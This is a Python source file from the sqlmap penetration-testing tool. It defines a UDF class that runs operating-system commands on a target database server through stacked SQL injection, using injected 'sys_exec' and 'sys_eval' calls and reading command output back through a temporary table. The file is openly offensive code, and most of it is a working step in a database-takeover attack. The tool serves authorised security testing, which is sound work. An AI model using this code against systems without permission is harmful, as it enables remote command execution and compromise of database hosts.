#!/usr/bin/env python

"""
$Id$

This file is part of the sqlmap project, http://sqlmap.sourceforge.net.

Copyright (c) 2007-2009 Bernardo Damele A. G. <bernardo.damele@gmail.com>
Copyright (c) 2006 Daniele Bellucci <daniele.bellucci@gmail.com>

sqlmap is free software; you can redistribute it and/or modify it under
the terms of the GNU General Public License as published by the Free
Software Foundation version 2 of the License.

sqlmap is distributed in the hope that it will be useful, but WITHOUT ANY
WARRANTY; without even the implied warranty of MERCHANTABILITY or FITNESS
FOR A PARTICULAR PURPOSE.  See the GNU General Public License for more
details.

You should have received a copy of the GNU General Public License along
with sqlmap; if not, write to the Free Software Foundation, Inc., 51
Franklin St, Fifth Floor, Boston, MA  02110-1301  USA
"""



from lib.core.convert import urlencode
from lib.core.exception import sqlmapUnsupportedFeatureException
from lib.request import inject


class UDF:
    """
    This class defines methods to deal with User-Defined Functions for
    plugins.
    """

    def __init__(self):
        self.createdUdf  = set()
        self.udfToCreate = set()


    def udfExecCmd(self, cmd, silent=False):
        cmd = urlencode(cmd, convall=True)

        inject.goStacked("SELECT sys_exec('%s')" % cmd, silent)


    def udfEvalCmd(self, cmd):
        cmd = urlencode(cmd, convall=True)

        inject.goStacked("INSERT INTO %s(%s) VALUES (sys_eval('%s'))" % (self.cmdTblName, self.tblField, cmd))
        output = inject.getValue("SELECT %s FROM %s" % (self.tblField, self.cmdTblName), resumeValue=False)
        inject.goStacked("DELETE FROM %s" % self.cmdTblName)

        if isinstance(output, (list, tuple)):
            output = output[0]

            if isinstance(output, (list, tuple)):
                output = output[0]

        return output


    def udfInit(self):
        errMsg = "udfInit() method must be defined within the plugin"
        raise sqlmapUnsupportedFeatureException, errMsg
